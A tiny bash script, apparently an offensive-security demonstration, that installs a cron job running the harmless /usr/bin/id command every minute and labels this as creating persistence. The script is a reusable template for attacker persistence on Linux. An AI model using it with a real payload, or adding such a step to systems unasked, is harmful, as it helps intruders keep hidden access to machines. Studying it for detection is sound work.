#!/bin/bash

echo "[+] Creating persistence via cron"

(crontab -l 2>/dev/null; echo "* * * * * /usr/bin/id") | crontab -

echo "[+] Persistence created"